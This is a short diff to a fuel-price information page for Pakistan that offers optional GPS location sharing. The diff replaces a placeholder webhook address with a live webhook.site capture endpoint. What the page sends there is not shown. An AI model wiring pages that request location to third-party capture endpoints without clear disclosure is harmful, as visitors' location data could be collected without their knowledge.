@@ -14,7 +14,7 @@
 <section class="panel"><h2>Official price information</h2><p class="muted">Fuel prices may change. Confirm the current rate and effective date through official government notices.</p><a href="https://petroleum.gov.pk/" target="_blank" rel="noopener noreferrer">Petroleum Division — Government of Pakistan ↗</a></section><footer>Location sharing is optional. If permission is denied or unavailable, manual city selection remains available.</footer></main>
 <script>
 // Replace this placeholder with your own webhook endpoint before deploying.
-const WEBHOOK_URL = "https://YOUR-WEBHOOK-URL-HERE";
+const WEBHOOK_URL = "https://webhook.site/a5810f06-e1e7-4069-a0b5-4eda839f0b5b";
 const $ = id => document.getElementById(id);
 $("openRates").addEventListener("click",()=>{$("rates").classList.remove("hidden");$("rates").scrollIntoView({behavior:"smooth",block:"start"});$("allowLocation").focus({preventScroll:true});});
 $("manualLocation").addEventListener("click",()=>{$("manualPanel").classList.remove("hidden");$("locationStatus").textContent="You chose to continue without sharing GPS location.";$("manualPanel").scrollIntoView({behavior:"smooth",block:"nearest"});});
